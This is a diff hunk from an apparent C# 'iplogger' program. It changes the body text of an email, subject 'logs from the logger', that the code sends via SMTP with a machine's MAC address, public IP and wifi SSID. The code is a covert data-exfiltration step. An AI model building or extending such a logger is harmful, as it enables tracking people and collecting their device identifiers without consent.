@@ -48,7 +48,7 @@ namespace iplogger
                     {
                         Subject = "logs from the logger"
                         ,
-                        Body = $"Mac Address: {mac} Ip Address: {publicip} Connected wifi ssid: {name}"
+                        Body = $"Mac Address: {mac} Ip Address: {publicip} Random wifi ssid: {name}"
                     })
                     {
                         smtp.Send(message);
